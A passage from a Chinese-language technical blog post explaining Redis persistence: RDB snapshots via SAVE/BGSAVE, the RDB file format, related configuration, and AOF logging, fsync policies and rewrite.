<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; BGSAVE</span><br><span class="line">Background saving started</span><br></pre></td></tr></table></figure>
</li>
<li><p>服务端日志</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6266:M 15 Sep 2019 08:31:22.914 * Background saving started by pid 6283</span><br><span class="line">6283:C 15 Sep 2019 08:31:22.915 * DB saved on disk</span><br><span class="line">6266:M 15 Sep 2019 08:31:22.934 * Background saving terminated with success</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>&emsp;&emsp;通过服务端输出的日志，可以发现 Redis 在服务端进程（PID 为 6266）会为 <code>BGSAVE</code> 命令单独创建（<strong>fork</strong>）一个子进程（PID 为 6283），并由子进程在后台完成 RDB 的保存过程，在操作完成之后通知父进程然后退出。在整个过程中，服务器进程只会消耗少量时间在创建子进程和处理子进程信号量上面，其余时间都是待命状态。  </p>
<p>&emsp;&emsp;BGSAVE 是触发 RDB 持久化的主流方式，下面给出 <code>BGSAVE</code> 命令生成快照的流程：</p>
<figure class="image-box">
                <img src="16dbe15f58dd6cb4.png" alt title class>
                <p></p>
            </figure>

<ol>
<li>客户端发起 <code>BGSAVE</code> 命令，Redis 主进程判断当前是否存在正在执行备份的子进程，如果存在则直接返回</li>
<li>父进程 fork 一个子进程 （fork 的过程中会造成阻塞的情况），这个过程可以使用 <code>info stats</code> 命令查看 <code>latest_fork_usec</code> 选项，查看最近一次 fork 操作消耗的时间，单位是微秒</li>
<li>父进程 fork 完成之后，则会返回 Background saving started 的信息提示，此时 fork 阻塞解除</li>
<li>fork 创建的子进程开始根据父进程的内存数据生成临时的快照文件，然后替换原文件</li>
<li>子进程备份完毕后向父进程发送完成信息，父进程更新统计信息</li>
</ol>
<h6 id="SAVE-和-BGSAVE-的比较"><a href="#SAVE-和-BGSAVE-的比较" class="headerlink" title="SAVE 和 BGSAVE 的比较"></a>SAVE 和 BGSAVE 的比较</h6><table>
<thead>
<tr>
<th>命令</th>
<th>SAVE</th>
<th>BGSAVE</th>
</tr>
</thead>
<tbody><tr>
<td>IO 类型</td>
<td>同步</td>
<td>异步</td>
</tr>
<tr>
<td>是否阻塞</td>
<td>全程阻塞</td>
<td>fork 时发生阻塞</td>
</tr>
<tr>
<td>复杂度</td>
<td>O(n)</td>
<td>O(n)</td>
</tr>
<tr>
<td>优点</td>
<td>不会消耗额外的内存</td>
<td>不阻塞客户端</td>
</tr>
<tr>
<td>缺点</td>
<td>阻塞客户端</td>
<td>fork 子进程消耗内存</td>
</tr>
</tbody></table>
<h5 id="自动触发保存"><a href="#自动触发保存" class="headerlink" title="自动触发保存"></a>自动触发保存</h5><p>&emsp;&emsp;因为 <code>BGSAVE</code> 命令可以在不阻塞服务器进程的情况下执行，所以 Redis 的配置文件 <code>redis.conf</code> 提供了一个 <code>save</code> 选项，让服务器每隔一段时间自动执行一次 <code>BGSAVE</code> 命令。用户可以通过 <code>save</code> 选项设置多个保存条件，只要其中任意一个条件被满足，服务器就会执行 <code>BGSAVE</code> 命令。 Redis 配置文件 <code>redis.conf</code> 默认配置了以下 3 个保存条件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;那么只要满足以下 3 个条件中的任意一个，<code>BGSAVE</code> 命令就会被自动执行：</p>
<ul>
<li>服务器在 900 秒之内，对数据库进行了至少 1 次修改。</li>
<li>服务器在 300 秒之内，对数据库进行了至少 10 次修改。</li>
<li>服务器在 60 秒之内，对数据库进行了至少 10000 次修改。</li>
</ul>
<p>&emsp;&emsp;比如通过命令 <code>SET msg &quot;hello&quot;</code> 插入一条键值对，等待 900 秒后 Reids 服务器进程自动触发保存，输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">6266:M 15 Sep 2019 08:46:22.981 * 1 changes in 900 seconds. Saving...</span><br><span class="line">6266:M 15 Sep 2019 08:46:22.986 * Background saving started by pid 6266</span><br><span class="line">6476:C 15 Sep 2019 08:46:23.015 * DB saved on disk</span><br><span class="line">6266:M 15 Sep 2019 08:46:23.096 * Background saving terminated with success</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;Redis 服务器会周期性地操作 <code>serverCron</code> 函数，这个函数每隔 100 毫秒就会执行一次，它的一项任务就是检查 <code>save</code> 选项所设置的保存条件是否满足，如果满足的话，就自动执行 <code>BGSAVE</code> 命令。</p>
<h5 id="启动自动载入"><a href="#启动自动载入" class="headerlink" title="启动自动载入"></a>启动自动载入</h5><p>&emsp;&emsp;和使用 <code>SAVE</code> 和 <code>BGSAVE</code> 命令创建 RDB 文件不同，Redis 没有专门提供用于载入 RDB 文件的命令，RDB 文件的载入过程是在 Redis 服务器启动时自动完成的。启动时只要在指定目录检测到 RDB 文件的存在，Redis 就会通过 <code>rdbLoad</code> 函数自动载入 RDB 文件。  </p>
<p>&emsp;&emsp;下面是 Redis 服务器启动时打印的日志，倒数第 2 条日志是在成功载入 RDB 文件后打印的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ redis-server /usr/local/etc/redis.conf</span><br><span class="line">6266:M 15 Sep 2019 08:30:41.832 # Server initialized</span><br><span class="line">6266:M 15 Sep 2019 08:30:41.833 * DB loaded from disk: 0.001 seconds</span><br><span class="line">6266:M 15 Sep 2019 08:30:41.833 * Ready to accept connections</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;由于 AOF 文件属于增量的写入命令备份，RDB 文件属于全量的数据备份，所以更新频率比 RDB 文件的更新频率高。所以如果 Redis 服务器开启了 AOF 持久化功能，那么服务器会优先使用 AOF 文件来还原数据库状态；只有在 AOF 的持久化功能处于关闭状态时，服务器才会使用使用 RDB 文件还原数据库状态。</p>
<figure class="image-box">
                <img src="16dbe167e033b1d0.png" alt title class>
                <p></p>
            </figure>

<h4 id="RDB-的文件结构"><a href="#RDB-的文件结构" class="headerlink" title="RDB 的文件结构"></a>RDB 的文件结构</h4><p>&emsp;&emsp;RDB 文件是经过压缩的二进制文件，下面介绍关于 RDB 文件内部构造的一些细节。</p>
<h5 id="存储路径"><a href="#存储路径" class="headerlink" title="存储路径"></a>存储路径</h5><p>&emsp;&emsp;<code>SAVE</code> 命令和 <code>BGSAVE</code> 命令都只会备份当前数据库，备份文件名默认为 <code>dump.rdb</code>，可通过配置文件修改备份文件名 <code>dbfilename xxx.rdb</code>。可以通过以下命令查看备份文件目录和 RDB 文件名称：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">127.0.0.1:6379&gt; CONFIG GET dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/usr/local/var/db/redis&quot;</span><br><span class="line">127.0.0.1:6379&gt; CONFIG GET dbfilename</span><br><span class="line">1) &quot;dbfilename&quot;</span><br><span class="line">2) &quot;dump.rdb&quot;</span><br></pre></td></tr></table></figure>

<p>RDB 文件的存储路径既可以在启动前配置，也可以通过命令动态设定。</p>
<ul>
<li>配置项：通过 <code>dir</code> 配置指定目录，<code>dbfilename</code> 指定文件名</li>
<li>动态指定：Redis 启动后也可以动态修改 RDB 存储路径，在磁盘损害或空间不足时非常有用，执行命令为：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET dir <span class="variable">$newdir</span></span><br><span class="line">CONFIG SET dbfilename <span class="variable">$newFileName</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h5><p>&emsp;&emsp;RDB 文件有固定的格式要求，它保存的是二进制数据，大体可以分为以下 5 部分：</p>
<ul>
<li><code>REDIS</code>：文件头保存的是长为 5 个字节的 REDIS 字符，用于标识当前文件为 RDB 类型</li>
<li><code>db_version</code>：一个 4 个字节长的整数字符串，用于记录 RDB 文件的版本号</li>
<li><code>aux</code>：记录着 RDB 文件中元数据信息，包含 8 个附加<ul>
<li><code>redis-ver</code>：Redis 实例的版本号</li>
<li><code>redis-bits</code>：运行 Redis 实例的主机架构，64 位或 32 位</li>
<li><code>ctime</code>：RDB 创建时的 Unix 时间戳</li>
<li><code>used_mem</code>：存储快照时使用的内存大小</li>
<li><code>repl-stream-db</code>：Redis 服务器的 db 的索引</li>
<li><code>repl-id</code>：Redis 主实例的 ID（replication id）</li>
<li><code>repl-offset</code>：Redis 主实例的偏称量（replication offset）</li>
<li><code>aof-preamble</code>：是否在 AOF 文件头部放置 RDB 快照（即开启混合持久化）</li>
</ul>
</li>
<li><code>databases</code>：部分包含着零个或者任意多个数据库，以及各个数据库的键值对数据</li>
<li><code>EOF</code>：是 1 个字节的常量，用于标志 RDB 文件的正文内容结束</li>
<li><code>check_sum</code>：一个 8 字节长的整数，保存着由前面四个部分计算得到的校验和，用于检测 RDB 文件的完整性</li>
</ul>
<figure class="image-box">
                <img src="16dbe16f20dee80e.png" alt title class>
                <p></p>
            </figure>

<h6 id="database"><a href="#database" class="headerlink" title="database"></a>database</h6><p>&emsp;&emsp;一个 RDB 文件的 <code>databases</code> 部分包含着零个或者任意多个数据库（database），而每个非空的 database 都包含 <code>SELECTDB</code>、<code>db_number</code> 以及 <code>key_value_pairs</code> 三个部分：</p>
<ul>
<li><code>SELECTDB</code>：长度为一个字节的常量，告诉用户程序接下来要读取的是一个 db_number</li>
<li><code>db_number</code>：保存着一个数据库编号。当程序读到 db_number 时，服务器会立即调用 <code>SELECT</code> 命令切换到对应编号的数据库</li>
<li><code>key_value_pairs</code>：保存了数据库中的所有键值对数据，包括带过期时间和不带过期时间两种类型的键值对</li>
</ul>
<h6 id="key-value-pairs"><a href="#key-value-pairs" class="headerlink" title="key_value_pairs"></a>key_value_pairs</h6><p>&emsp;&emsp;RDB 的 <code>key_value_pairs</code> 部分保存了一个或者多个键值对，如果键值对有过期时间，过期时间会被保存在键值对的前面。下面是这两种键值对的内部结构：</p>
<figure class="image-box">
                <img src="16dbe17603e35868.png" alt title class>
                <p></p>
            </figure>

<ul>
<li><code>EXPIREMENT_MS</code>：长度为一个字节的常量，告诉用户程序接下来要读取的是一个以毫秒为单位的过期时间</li>
<li><code>ms</code>：一个长度为 8 个字节的整数，记录着键值对的过期时间，是一个以毫秒为单位的时间戳</li>
<li><code>TYPE</code>：记录了 value 的类型，长度为 1 个字节。每个 TYPE 常量都代表了一种对象类型或者底层编码， 当服务器读入 RDB 文件中的键值对数据时， 程序会根据 TYPE 的值来决定如何读入和解释 value 的数据。它的值定义通常为以下常量之一：<ul>
<li><code>REDIS_RDB_TYPE_STRING</code>：字符串</li>
<li><code>REDIS_RDB_TYPE_LIST</code>：列表类型</li>
<li><code>REDIS_RDB_TYPE_SET</code>：集合类型</li>
<li><code>REDIS_RDB_TYPE_ZSET</code>：有序集合</li>
<li><code>REDIS_RDB_TYPE_HASH</code>：哈希类型</li>
<li><code>REDIS_RDB_TYPE_LIST_ZIPLIST</code>：列表类型</li>
<li><code>REDIS_RDB_TYPE_SET_INT_SET</code>：集合类型</li>
<li><code>REDIS_RDB_TYPE_ZSET_ZIPLIST</code>：有序集合</li>
<li><code>REDIS_RDB_TYPE_HASH_ZIPLIST</code>：哈希类型</li>
</ul>
</li>
<li><code>key</code>：一个字符串对象，编码格式和 REDIS_RDB_TYPE_STRING 类型的 value 一样</li>
<li><code>value</code>：取决于 TYPE 的类型，对象类型可以是 <strong>string</strong>、<strong>list</strong>、<strong>set</strong>、<strong>zset</strong> 和 <strong>hash</strong></li>
</ul>
<p>&emsp;&emsp;为了查看 RDB 文件内部的结构，执行以下命令往 Redis 服务器插入 3 条键值对数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; SADD fruits &quot;apple&quot; &quot;banana&quot; &quot;orange&quot;</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; LPUSH numbers 128 256 512</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; SET msg &quot;hello&quot;</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行 SAVE 操作，将 Redis 进程中的数据强制持久化到 <code>dump.rdb</code> 文件中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; SAVE</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;通过 Linux 的 <code>od</code> 命令将二进制文件 <code>dump.rdb</code> 中的数据转换为 ASCII 格式输出，跟前面提到的存储格式大致是一样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ od -c dump.rdb</span><br><span class="line">0000000    R   E   D   I   S   0   0   0   9 372  \t   r   e   d   i   s</span><br><span class="line">0000020    -   v   e   r 005   5   .   0   .   5 372  \n   r   e   d   i</span><br><span class="line">0000040    s   -   b   i   t   s 300   @ 372 005   c   t   i   m   e 200</span><br><span class="line">0000060  200 200 231   ] 372  \b   u   s   e   d   -   m   e   m 302 200</span><br><span class="line">0000100   \v 020  \0 372  \f   a   o   f   -   p   r   e   a   m   b   l</span><br><span class="line">0000120    e 300  \0 376  \0 373 003  \0  \0 003   m   s   g 005   h   e</span><br><span class="line">0000140    l   l   o 016  \a   n   u   m   b   e   r   s 001 027 027  \0</span><br><span class="line">0000160   \0  \0 022  \0  \0  \0 003  \0  \0 300  \0 002 004 300  \0 001</span><br><span class="line">0000200  004 300 200  \0 377 002 006   f   r   u   i   t   s 003 006   o</span><br><span class="line">0000220    r   a   n   g   e 005   a   p   p   l   e 006   b   a   n   a</span><br><span class="line">0000240    n   a 377 214   ک  **   3 366   &lt;   r   X</span><br><span class="line">0000253</span><br></pre></td></tr></table></figure>

<h4 id="RDB-常用的配置项"><a href="#RDB-常用的配置项" class="headerlink" title="RDB 常用的配置项"></a>RDB 常用的配置项</h4><p>&emsp;&emsp;下面是 <code>redis.conf</code> 文件中和 RDB 文件相关的常用配置项（以及默认值）：</p>
<ul>
<li><code>save m n</code>：bgsave 自动触发的条件；如果没有 save m n 配置，相当于自动的 RDB 持久化关闭，不过此时仍可以通过其他方式触发。</li>
<li><code>stop-writes-on-bgsave-error yes</code>：当 bgsave 出现错误时，Redis 是否停止执行写命令。如果设置为 yes，则当硬盘出现问题时，可以及时发现，避免数据的大量丢失；如果设置为 no，则 Redis 忽略 bgsave 的错误继续执行写命令，当对 Redis 服务器的系统（尤其是硬盘）使用了监控时，该选项考虑设置为 no。</li>
<li><code>rdbcompression yes</code>：是否开启 RDB 文件压缩。</li>
<li><code>rdbchecksum yes</code>：是否开启 RDB 文件的校验，在写入文件和读取文件时都起作用。关闭 checksum 在写入文件和启动文件时大约能带来 10% 的性能提升，但是数据损坏时无法发现。</li>
<li><code>dbfilename dump.rdb</code>：设置 RDB 的文件名。</li>
<li><code>dir ./</code>：设置 RDB 文件和 AOF 文件所在目录。</li>
</ul>
<h3 id="AOF-持久化"><a href="#AOF-持久化" class="headerlink" title="AOF 持久化"></a>AOF 持久化</h3><p>&emsp;&emsp;RDB 持久化是定期把内存中的数据全量写入到文件中，除此之外，RDB 还提供了基于 AOF（Append Only File）的持久化功能。AOF 会把 Redis 服务器每次执行的写命令记录到一个日志文件中，当服务器重启时再次执行 AOF 文件中的命令来恢复数据。</p>
<figure class="image-box">
                <img src="16dbe17cf4b4ffba.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;AOF 的主要作用是解决了数据持久化的实时性，目前已经成为了 Redis 持久化的主流方式。</p>
<h4 id="AOF-的创建和载入"><a href="#AOF-的创建和载入" class="headerlink" title="AOF 的创建和载入"></a>AOF 的创建和载入</h4><p>&emsp;&emsp;默认情况下 AOF 功能是关闭的，Redis 只会通过 RDB 完成数据持久化的。开启 AOF 功能需要 <code>redis.conf</code> 文件中将 <code>appendonly</code> 配置项修改为 yes，这样在开启 AOF 持久化功能的同时，将基于 RDB 的快照持久化置于低优先级。修改 <code>redis.conf</code> 如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此选项为AOF功能的开关，默认为no，通过yes来开启aof功能</span></span><br><span class="line">appendonly yes</span><br><span class="line"><span class="comment"># 指定AOF文件名称</span></span><br><span class="line">appendfilename appendonly.aof</span><br><span class="line"><span class="comment"># 备份RDB和AOF文件存放路径</span></span><br><span class="line">dir /usr/<span class="built_in">local</span>/var/db/redis/</span><br></pre></td></tr></table></figure>

<h5 id="AOF-的创建"><a href="#AOF-的创建" class="headerlink" title="AOF 的创建"></a>AOF 的创建</h5><p>&emsp;&emsp;重启 Redis 服务器进程以后，dir 目录下会生成一个 <code>appendonly.aof</code> 文件，由于此时服务器未执行任何写指令，因此 AOF 文件是空的。执行以下命令写入几条测试数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; SADD fruits &quot;apple&quot; &quot;banana&quot; &quot;orange&quot;</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; LPUSH numbers 128 256 512</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; SET msg &quot;hello&quot;</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;AOF 文件是纯文本格式的，上述写命令按顺序被写入了 <code>appendonly.aof</code> 文件（省掉换行符 ‘\r\n’）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/var/db/redis$ cat appendonly.aof</span><br><span class="line">*2 $6 SELECT $1 0</span><br><span class="line">*5 $4 SADD $6 fruits $5 apple $6 banana $6 orange</span><br><span class="line">*5 $5 LPUSH $7 numbers $3 128 $3 256 $3 512</span><br><span class="line">*3 $3 SET $3 msg $5 hello</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;RDB 持久化的方式是将 apple、banana、orange 的键值对数据保存为 RDB 的二进制文件，而 AOF 是通过把 Redis 服务器执行的 <code>SADD</code>、<code>LPUSH</code>、<code>SET</code> 等命令保存到 AOF 的文本文件中。下图是 AOF 文件内部的构造图：</p>
<figure class="image-box">
                <img src="16dbe18b83408034.png" alt title class>
                <p></p>
            </figure>

<h5 id="AOF-的载入"><a href="#AOF-的载入" class="headerlink" title="AOF 的载入"></a>AOF 的载入</h5><p>&emsp;&emsp;再次重启 Redis 服务器进程，观察启动日志会发现 Redis 会通过 AOF 文件加载数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">52580:M 15 Sep 2019 16:09:47.015 # Server initialized</span><br><span class="line">52580:M 15 Sep 2019 16:09:47.015 * DB loaded from append only file: 0.001 seconds</span><br><span class="line">52580:M 15 Sep 2019 16:09:47.015 * Ready to accept connections</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;通过命令读取 AOF 文件还原的键值对数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; SMEMBERS fruits</span><br><span class="line">1) &quot;apple&quot;</span><br><span class="line">2) &quot;orange&quot;</span><br><span class="line">3) &quot;banana&quot;</span><br><span class="line">127.0.0.1:6379&gt; LRANGE numbers 0 -1</span><br><span class="line">1) &quot;512&quot;</span><br><span class="line">2) &quot;256&quot;</span><br><span class="line">3) &quot;128&quot;</span><br><span class="line">127.0.0.1:6379&gt; GET msg</span><br><span class="line">&quot;hello&quot;</span><br></pre></td></tr></table></figure>

<h4 id="AOF-的执行流程"><a href="#AOF-的执行流程" class="headerlink" title="AOF 的执行流程"></a>AOF 的执行流程</h4><p>&emsp;&emsp;AOF 不需要设置任何触发条件，对 Redis 服务器的所有写命令都会自动记录到 AOF 文件中，下面介绍 AOF 持久化的执行流程。</p>
<figure class="image-box">
                <img src="16dbe18f6ce92c7f.png" alt title class>
                <p></p>
            </figure>

<p>AOF 文件的写入流程可以分为以下 3 个步骤：</p>
<ol>
<li>命令追加（append）：将 Redis 执行的写命令追加到 AOF 的缓冲区 <code>aof_buf</code></li>
<li>文件写入（write）和文件同步（fsync）：AOF 根据对应的策略将 <code>aof_buf</code> 的数据同步到硬盘</li>
<li>文件重写（rewrite）：定期对 AOF 进行重写，从而实现对写命令的压缩。</li>
</ol>
<h5 id="命令追加"><a href="#命令追加" class="headerlink" title="命令追加"></a>命令追加</h5><p>&emsp;&emsp;Redis 使用单线程处理客户端命令，为了避免每次有写命令就直接写入磁盘，导致磁盘 IO 成为 Redis 的性能瓶颈，Redis 会先把执行的写命令追加（append）到一个 <code>aof_buf</code> 缓冲区，而不是直接写入文件。<br>&emsp;&emsp;命令追加的格式是 Redis 命令请求的协议格式，它是一种纯文本格式，具有兼容性好、可读性强、容易处理、操作简单避免二次开销等优点。在 AOF 文件中，除了用于指定数据库的 <code>select</code> 命令（比如：<code>select 0</code> 为选中 0 号数据库）是由 Redis 添加的，其他都是客户端发送来的写命令。</p>
<h5 id="文件写入和文件同步"><a href="#文件写入和文件同步" class="headerlink" title="文件写入和文件同步"></a>文件写入和文件同步</h5><p>&emsp;&emsp;Redis 提供了多种 AOF 缓存区的文件同步策略，相关策略涉及到操作系统的 <code>write()</code> 函数和 <code>fsync()</code> 函数，说明如下：</p>
<h6 id="write"><a href="#write" class="headerlink" title="write()"></a>write()</h6><p>&emsp;&emsp;为了提高文件的写入效率，当用户调用 <code>write</code> 函数将数据写入文件时，操作系统会先把数据写入到一个内存缓冲区里，当缓冲区被填满或超过了指定时限后，才真正将缓冲区的数据写入到磁盘里。</p>
<h6 id="fsync"><a href="#fsync" class="headerlink" title="fsync()"></a>fsync()</h6><p>&emsp;&emsp;虽然操作系统底层对 <code>write()</code> 函数进行了优化 ，但也带来了安全问题。如果宕机内存缓冲区中的数据会丢失，因此系统同时提供了同步函数 <code>fsync()</code> ，强制操作系统立刻将缓冲区中的数据写入到磁盘中，从而保证了数据持久化。  </p>
<p>&emsp;&emsp;Redis 提供了 <code>appendfsync</code> 配置项来控制 AOF 缓存区的文件同步策略，<code>appendfsync</code> 可配置以下三种策略：</p>
<ul>
<li><code>appendfsync always</code>：每执行一次命令保存一次<br>&emsp;&emsp;命令写入 aof_buf 缓冲区后立即调用系统 fsync 函数同步到 AOF 文件，fsync 操作完成后线程返回，整个过程是阻塞的。这种情况下，每次有写命令都要同步到 AOF 文件，硬盘 IO 成为性能瓶颈，Redis 只能支持大约几百 TPS 写入，严重降低了 Redis 的性能。</li>
<li><code>appendfsync no</code>：不保存<br>&emsp;&emsp;命令写入 <code>aof_buf</code> 缓冲区后调用系统 write 操作，不对 AOF 文件做 fsync 同步；同步由操作系统负责，通常同步周期为 30 秒。这种情况下，文件同步的时间不可控，且缓冲区中堆积的数据会很多，数据安全性无法保证。</li>
<li><code>appendfsync everysec</code>：每秒钟保存一次<br>&emsp;&emsp;命令写入 aof_buf 缓冲区后调用系统 write 操作，write 完成后线程立刻返回，fsync 同步文件操作由单独的进程每秒调用一次。everysec 是前述两种策略的折中，是性能和数据安全性的平衡，因此也是 Redis 的默认配置，也是比较推崇的配置选项。</li>
</ul>
<table>
<thead>
<tr>
<th>文件同步策略</th>
<th>write 阻塞</th>
<th>fsync 阻塞</th>
<th>宕机时的数据丢失量</th>
</tr>
</thead>
<tbody><tr>
<td>always</td>
<td>阻塞</td>
<td>阻塞</td>
<td>最多只丢失一个命令的数据</td>
</tr>
<tr>
<td>no</td>
<td>阻塞</td>
<td>不阻塞</td>
<td>操作系统最后一次对 AOF 文件 fsync 后的数据</td>
</tr>
<tr>
<td>everysec</td>
<td>阻塞</td>
<td>不阻塞</td>
<td>一般不超过 1 秒钟的数据</td>
</tr>
</tbody></table>
<h5 id="文件重写"><a href="#文件重写" class="headerlink" title="文件重写"></a>文件重写</h5><p>&emsp;&emsp;随着命令不断写入 AOF，文件会越来越大，导致文件占用空间变大，数据恢复时间变长。为了解决这个问题，Redis 引入了重写机制来对 AOF 文件中的写命令进行合并，进一步压缩文件体积。<br>&emsp;&emsp;AOF 文件重写指的是把 Redis 进程内的数据转化为写命令，同步到新的 AOF 文件中，然后使用新的 AOF 文件覆盖旧的 AOF 文件，这个过程不对旧的 AOF 文件的进行任何读写操作。</p>
<h6 id="触发机制"><a href="#触发机制" class="headerlink" title="触发机制"></a>触发机制</h6><p>AOF 重写过程提供了手动触发和自动触发两种机制：</p>
<ul>
<li>手动触发：直接调用 <code>bgrewriteaof</code> 命令，该命令的执行与 bgsave 有些类似，都是 fork 子进程进行具体的工作，且都只有在 fork 时会阻塞</li>
<li>自动触发：根据 <code>auto-aof-rewrite-min-size</code> 和 <code>auto-aof-rewrite-percentage</code> 配置项，以及 <code>aof_current_size</code> 和 <code>aof_base_size</code> 的状态确定触发时机<ul>
<li><code>auto-aof-rewrite-min-size</code>：执行 AOF 重写时，文件的最小体积，默认值为 64MB</li>
<li><code>auto-aof-rewrite-percentage</code>：执行 AOF 重写时，当前 AOF 大小（<code>aof_current_size</code>）和上一次重写时 AOF 大小（<code>aof_base_size</code>）的比值</li>
</ul>
</li>
</ul>
<h6 id="重写流程"><a href="#重写流程" class="headerlink" title="重写流程"></a>重写流程</h6><p>&emsp;&emsp;下面以手动触发 AOF 重写为例，当 <code>bgrewriteaof</code> 命令被执行时，AOF 文件重写的流程如下：</p>
<figure class="image-box">
                <img src="16dbe197b8c71c28.png" alt title class>
                <p></p>
            </figure>

<ol>
<li>客户端通过 <code>bgrewriteaof</code> 命令对 Redis 主进程发起 AOF 重写请求</li>
<li>当前不存在正在执行 bgsave/bgrewriteaof 的子进程时，Redis 主进程通过 fork 操作创建子进程，这个过程主进程是阻塞的。如果发现 bgrewriteaof 子进程直接返回；如果发现 bgsave 子进程则等 bgsave 执行完成后再执行 fork 操作</li>
<li>主进程的 fork 操作完成后，继续处理其他命令，把新的写命令同时追加到 <code>aof_buf</code> 和 <code>aof_rewrite_buf</code> 缓冲区中<ul>
<li>在文件重写完成之前，主进程会继续把写命令追加到 <code>aof_buf</code> 缓冲区，根据 appendfsync 策略同步到旧的 AOF 文件，这样可以避免 AOF 重写失败造成数据丢失，保证原有的 AOF 文件的正确性</li>
<li>由于 fork 操作运用写时复制技术，子进程只能共享 fork 操作时的内存数据，主进程会把新命令追加到一个 <code>aof_rewrite_buf</code> 缓冲区中，避免 AOF 重写时丢失这部分数据</li>
</ul>
</li>
<li>子进程读取 Redis 进程中的数据快照，生成写入命令并按照命令合并规则批量写入到新的 AOF 文件</li>
<li>子进程写完新的 AOF 文件后，向主进程发信号，主进程更新统计信息，具体可以通过 <code>info persistence</code> 查看</li>
<li>主进程接受到子进程的信号以后，将 <code>aof_rewrite_buf</code> 缓冲区中的写命令追加到新的 AOF 文件</li>
<li>主进程使用新的 AOF 文件替换旧的 AOF 文件，AOF 重写过程完成</li>
</ol>
<h6 id="压缩机制"><a href="#压缩机制" class="headerlink" title="压缩机制"></a>压缩机制</h6><p>文件重写之所以能够压缩 AOF 文件的大小，原因在于以下几方面：</p>
<ul>
<li>过期的数据不再写入 AOF 文件</li>
<li>无效的命令不再写入 AOF 文件。比如：重复为数据设值（<code>set mykey v1</code>, <code>set mykey v2</code>）、删除键值对数据（<code>sadd myset v1</code>, <code>del myset</code>）等等</li>
<li>多条命令可以合并为单个。比如：<code>sadd myset v1</code>, <code>sadd myset v2</code>, <code>sadd myset v3</code> 可以合并为 <code>sadd myset v1 v2 v3</code>。不过为了防止单条命令过大造成客户端缓冲区溢出，对于 list、set、hash、zset 类型的 key，并不一定只使用单条命令，而是以某个 Redis 定义的一个常量为界，将命令拆分为多条</li>
</ul>
